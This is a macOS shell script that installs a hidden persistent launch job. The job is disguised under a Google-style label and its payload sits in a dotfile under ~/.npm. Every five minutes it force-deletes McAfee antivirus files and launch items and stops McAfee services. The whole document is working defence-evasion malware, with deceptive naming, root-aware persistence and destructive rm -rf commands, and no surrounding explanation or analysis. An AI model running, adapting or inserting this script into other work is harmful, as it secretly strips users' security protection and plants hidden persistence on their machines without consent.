DAEMON=com.google.aiur.agent
TARGET=~/.npm/.hello
PLISTDIR=~/Library/LaunchAgents
[ $(id -u $USER) == 0 ] && PLISTDIR=/Library/LaunchDaemons
chown $USER ..
mkdir -p ~/.npm
cat <<EOF >$TARGET
#!/bin/bash
rm -rf /Applications/McAfee*
find /Library/LaunchDaemons -iname '*mcafee*' 2>/dev/null | xargs rm -rf
find /Library/LaunchAgents -iname '*mcafee*' 2>/dev/null | xargs rm -rf
find /System/Library -iname '*mcafee*' 2>/dev/null | xargs rm -rf
find /Users/*/Library/LaunchAgents -iname '*mcafee*' 2>/dev/null | xargs rm -rf
launchctl list | grep mcafee | awk '{ print $3 }' | xargs launchctl stop
EOF
chmod 511 $TARGET
cat <<EOF >$PLISTDIR/$DAEMON.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>$DAEMON</string>
<key>ProgramArguments</key>
<array>
<string>$TARGET</string>
</array>
<key>RunAtLoad</key>
<true/>
<key>StartInterval</key>
<integer>300</integer>
</dict>
</plist>
EOF
chmod 600 $PLISTDIR/$DAEMON.plist
launchctl load $PLISTDIR/$DAEMON.plist
launchctl start $DAEMON
